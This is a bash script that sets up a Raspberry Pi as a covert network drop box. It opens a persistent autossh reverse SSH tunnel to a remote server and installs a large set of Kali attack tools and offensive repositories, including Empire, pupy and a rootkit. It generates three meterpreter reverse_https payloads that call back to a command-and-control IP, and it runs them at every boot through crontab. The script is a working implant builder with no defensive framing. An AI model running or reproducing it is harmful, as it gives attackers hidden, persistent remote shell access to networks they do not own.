#!/bin/bash

#To Do
#Openvpn auto install to create reverse tunnel to c2 server

echo "Make sure you are root!"
read -p "Enable ssh at boot and disable GUI autologin do not reboot"
raspi-config
read -p "Enter remote server details (user@remoteserver): " remoteserver
apt-get update
apt-get upgrade -y
apt-get dist-upgrade -y
hostname device
ssh-keygen

#Create autossh service
echo """[Unit]
Description=AutoSSH Tunnel
After=network.target

[Service]
User=root
ExecStart=/usr/bin/autossh -M 0 $remoteserver -p 22 -o "ExitOnForwardFailure=yes" -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" -N -R 2221:localhost:22
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
""" >> /etc/systemd/system/autossh.service

#Enable autossh service
ssh-copy-id $remoteserver
systemctl daemon-reload
systemctl start autossh.service
systemctl status autossh.service
read -p "Ensure service is started"
systemctl enable autossh.service

#install tools
echo "deb http://http.kali.org/kali kali-rolling main non-free contrib" >> /etc/apt/sources.list
apt-get update
apt-get -y install 6tunnel
apt-get -y install aircrack-ng
apt-get -y install amap
apt-get -y install apache2
apt-get -y install apt-file
apt-get -y install apt-show-versions
apt-get -y install arp-scan
apt-get -y install autoconf
apt-get -y install backdoor-factory
apt-get -y install bdfproxy
apt-get -y install bfbtester
apt-get -y install bing-ip2hosts
apt-get -y install bison
apt-get -y install bridge-utils
apt-get -y install bsqlbf
apt-get -y install btscanner
apt-get -y install build-essential
apt-get -y install bundler
apt-get -y install ca-certificates
apt-get -y install chaosreader
apt-get -y install chkrootkit
apt-get -y install chromium
apt-get -y install clusterd
apt-get -y install cryptcat
apt-get -y install curl
apt-get -y install cutycapt
apt-get -y install daemonfs
apt-get -y install darkstat
apt-get -y install dhcpdump
apt-get -y install dissy
apt-get -y install dmitry
apt-get -y install dns2tcp
apt-get -y install dnswalk
apt-get -y install dsniff
apt-get -y install dtrx
apt-get -y install enum4linux
apt-get -y install etherape
apt-get -y install exe2hexbat
apt-get -y install exploit-db
apt-get -y install fcrackzip
apt-get -y install file-roller
apt-get -y install fimap
apt-get -y install flasm
apt-get -y install foremost
apt-get -y install fping
apt-get -y install freerdp-x11
apt-get -y install ftp
apt-get -y install ftp-proxy
apt-get -y install galleta
apt-get -y install geany
apt-get -y install gedit
apt-get -y install gem
apt-get -y install ghettotooth
apt-get -y install git
apt-get -y install git-core
apt-get -y install gobuster
apt-get -y install golang
apt-get -y install googler
apt-get -y install hexedit
apt-get -y install hostmap
apt-get -y install hping3
apt-get -y install html2text
apt-get -y install htop
apt-get -y install htshells
apt-get -y install http-tunnel
apt-get -y install httptunnel
apt-get -y install httrack
apt-get -y install hydra
apt-get -y install hyperion
apt-get -y install ike-scan
apt-get -y install inguma
apt-get -y install iodine
apt-get -y install iotop
apt-get -y install ipcalc
apt-get -y install ipgrab
apt-get -y install ipv6calc
apt-get -y install isr-evilgrade
apt-get -y install john
apt-get -y install kismet
apt-get -y install knocker
apt-get -y install lcrack
apt-get -y install libapr1
apt-get -y install libaprutil1
apt-get -y install libcurl4-openssl-dev
apt-get -y install libpcap-dev
apt-get -y install libpq-dev
apt-get -y install libreadline6-dev
apt-get -y install libsqlite3-dev
apt-get -y install libssl-dev
apt-get -y install libsvn1
apt-get -y install libtool
apt-get -y install libxml2
apt-get -y install libxml2-dev
apt-get -y install libxslt-dev
apt-get -y install libyaml-dev
apt-get -y install locate
apt-get -y install lynis
apt-get -y install lynx
apt-get -y install macchanger
apt-get -y install mboxgrep
apt-get -y install mdk3
apt-get -y install medusa
apt-get -y install metagoofil
apt-get -y install msfpc
apt-get -y install mysqloit
apt-get -y install mz
apt-get -y install nbtscan
apt-get -y install ncftp
apt-get -y install ncurses-dev
apt-get -y install netcat-traditional
apt-get -y install netdiscover
apt-get -y install netrw
apt-get -y install netsed
apt-get -y install netwag
apt-get -y install netwox
apt-get -y install nikto
apt-get -y install nmap
apt-get -y install nmapsi4
apt-get -y install nstreams
apt-get -y install obexftp
apt-get -y install onesixtyone
apt-get -y install openssl
apt-get -y install openvpn
apt-get -y install ophcrack
apt-get -y install ophcrack-cli
apt-get -y install otp
apt-get -y install p0f
apt-get -y install p7zip-full
apt-get -y install packeth
apt-get -y install packit
apt-get -y install pbnj
apt-get -y install pdfcrack
apt-get -y install pentbox
apt-get -y install php
apt-get -y install pnscan
apt-get -y install postgresql
apt-get -y install postgresql-contrib
apt-get -y install powertop
apt-get -y install proxychains
apt-get -y install pscan
apt-get -y install psmisc
apt-get -y install ptunnel
apt-get -y install pure-ftpd
apt-get -y install pv
apt-get -y install pwgen
apt-get -y install python-m2crypto
apt-get -y install python-pip
apt-get -y install ranger
apt-get -y install rar
apt-get -y install ratproxy
apt-get -y install reaver
apt-get -y install remmina
apt-get -y install remmina-plugin-rdp
apt-get -y install remmina-plugin-vnc
apt-get -y install responder
apt-get -y install rsh-client
apt-get -y install ruby
apt-get -y install screen
apt-get -y install scrub
apt-get -y install seclists
apt-get -y install secure-delete
apt-get -y install sendemail
apt-get -y install s.e.t
apt-get -y install shellter
apt-get -y install shutter
apt-get -y install siege
apt-get -y install silversearcher-ag
apt-get -y install sipcrack
apt-get -y install sipvicious
apt-get -y install skipfish
apt-get -y install smbmap
apt-get -y install socat
apt-get -y install spectacle
apt-get -y install splint
apt-get -y install sqlbrute
apt-get -y install sqlite3
apt-get -y install sqlmap
apt-get -y install sqlninja
apt-get -y install sshuttle
apt-get -y install ssldump
apt-get -y install sslscan
apt-get -y install sslsniff
apt-get -y install sslstrip
apt-get -y install stunnel
apt-get -y install stunnel4
apt-get -y install subnetcalc
apt-get -y install swaks
apt-get -y install tcpdump
apt-get -y install tcpflow
apt-get -y install tcpick
apt-get -y install tcpreplay
apt-get -y install tcpslice
apt-get -y install tcpspy
apt-get -y install tcptrace
apt-get -y install tcpxtract
apt-get -y install testssl.sh
apt-get -y install tftpd
apt-get -y install theHarvester
#apt-get -y install tinyproxy
apt-get -y install tmux
#apt-get -y install tor
apt-get -y install torbrowser-launcher
apt-get -y install u3-tool
apt-get -y install udptunnel
apt-get -y install unace
apt-get -y install unicornscan
apt-get -y install unrar
apt-get -y install unzip
apt-get -y install upx-ucl
apt-get -y install ussp-push
apt-get -y install veil-evasion
apt-get -y install vidalia
apt-get -y install vinetto
apt-get -y install vlc
apt-get -y install vncviewer
apt-get -y install voiphopper
apt-get -y install voipong
#apt-get -y install vsftpd
apt-get -y install w3af
apt-get -y install w3af-console
apt-get -y install w3m
apt-get -y install wapiti
apt-get -y install wash
apt-get -y install wavemon
apt-get -y install wbox
apt-get -y install webacoo
apt-get -y install webhttrack
apt-get -y install webshells
apt-get -y install weplab
apt-get -y install wfuzz
apt-get -y install wget
apt-get -y install wifite
apt-get -y install windows-binaries
apt-get -y install wine
apt-get -y install wine32
apt-get -y install wipe
apt-get -y install wireshark
apt-get -y install wordlists
#apt-get -y install xinetd
apt-get -y install xprobe
apt-get -y install yersinia
apt-get -y install zenmap
apt-get -y install zerofree
apt-get -y install zip
apt-get -y install zlib1g
apt-get -y install zlib1g-dev
apt-get -y install zzuf

#Prep environment for metasploit
gem install bundler
gem install sqlite3 -v '1.3.13'
gem install nokogiri -v '1.8.2'
pip install pyminifier

#Download other tools
cd /opt
git clone https://github.com/trustedsec/social-engineer-toolkit.git
git clone https://github.com/offensive-security/exploit-database.git
git clone https://github.com/samratashok/nishang.git
git clone https://github.com/trustedsec/unicorn.git
git clone https://github.com/SpiderLabs/Responder.git
git clone https://github.com/adaptivethreat/Empire.git
git clone https://github.com/jdksec/Tools.git
git clone https://github.com/byt3bl33d3r/CrackMapExec.git
git clone https://github.com/FortyNorthSecurity/EyeWitness.git
git clone https://github.com/SecureAuthCorp/impacket.git
git clone https://github.com/nccgroup/autochrome.git
git clone https://github.com/robertdavidgraham/masscan.git
git clone https://github.com/BloodHoundAD/BloodHound.git
git clone https://github.com/danielmiessler/SecLists.git
git clone https://github.com/PowerShellMafia/PowerSploit.git
git clone https://github.com/ripsscanner/rips.git
git clone https://github.com/wireghoul/graudit.git
git clone https://github.com/Vozzie/uacscript.git
git clone https://github.com/xillwillx/MiniReverse_Shell_With_Parameters.git
git clone https://github.com/nullmode/gnmap-parser.git
git clone https://github.com/chokepoint/azazel.git
git clone https://github.com/n1nj4sec/pupy.git
git clone https://github.com/sensepost/reGeorg.git
git clone https://github.com/vrana/adminer.git
git clone https://github.com/NetSPI/cmdsql.git
git clone https://github.com/infodox/python-pty-shells.git
git clone https://github.com/mfontanini/dot11decrypt.git
git clone https://github.com/s7ephen/pfi.git
git clone https://github.com/inquisb/icmpsh.git
git clone https://github.com/breenmachine/dnsftp.git
git clone https://github.com/attackdebris/babel-sf.git
git clone https://github.com/T-S-A/smbspider.git
git clone https://github.com/byt3bl33d3r/CrackMapExec.git
git clone https://github.com/gojhonny/CredCrack.git
git clone https://github.com/byt3bl33d3r/cmd2powershell.git
git clone https://github.com/vysec/morphHTA.git
git clone https://github.com/aboul3la/Sublist3r.git
git clone https://github.com/Dionach/CMSmap.git
git clone https://github.com/epinna/tplmap.git
git clone https://github.com/galkan/crowbar.git
git clone https://github.com/droope/droopescan.git
wget https://gist.githubusercontent.com/UniIsland/3346170/raw/059aca1d510c615df3d9fedafabac4d538ebe352/SimpleHTTPServerWithUpload.py

#Install metasploit
cd /opt
wget https://github.com/rapid7/metasploit-framework/archive/master.zip
unzip master.zip
cd /opt/metasploit-framework-master
bundle install
updatedb
systemctl start postgresql
systemctl enable postgresql

#Generate payloads
read -p "Enter c2 server IP: " c2ip
echo "Generating Payloads... please wait"
/opt/metasploit-framework-master/msfvenom -p python/meterpreter/reverse_https LHOST=$c2ip LPORT=53 -f raw > /opt/shell53.py
/opt/metasploit-framework-master/msfvenom -p python/meterpreter/reverse_https LHOST=$c2ip LPORT=80 -f raw > /opt/shell80.py
/opt/metasploit-framework-master/msfvenom -p python/meterpreter/reverse_https LHOST=$c2ip LPORT=443 -f raw > /opt/shell443.py
echo "Copy the following file to c2 server as meterpreter.rc"
echo """
use exploit/multi/handler
set LHOST $c2ip
set LPORT 53
set payload python/meterpreter/reverse_https
set exitonsession false
exploit -j
use exploit/multi/handler
set LHOST $c2ip
set LPORT 80
set payload python/meterpreter/reverse_https
set exitonsession false
exploit -j
use exploit/multi/handler
set LHOST $c2ip
set LPORT 443
set payload python/meterpreter/reverse_https
set exitonsession false
exploit -j
""" | tee -a /opt/meterpreter.rc

#Generate boot sh file for starting the payloads
echo """#!/bin/bash
sleep 30
python /opt/shell53.py &
python /opt/shell80.py &
python /opt/shell443.py &""" > /opt/Payloads.sh
chmod +x /opt/Payloads.sh

#Make script autostart
cat <(crontab -l) <(echo "@reboot /bin/bash /opt/Payloads.sh") | crontab -

read -p "Run msfconsole -r meterpreter.rc on c2 server" 
echo "All tools installed"
echo "When the machine restarts you should receive 3 x meterpreter shells and the local pi ssh port should be mapped to 2221 on your remote server" 
echo "Check with: netstat -tulpn"
read -p "echo "Once your remote server is listening with metasploit press enter to reboot and check your connection"
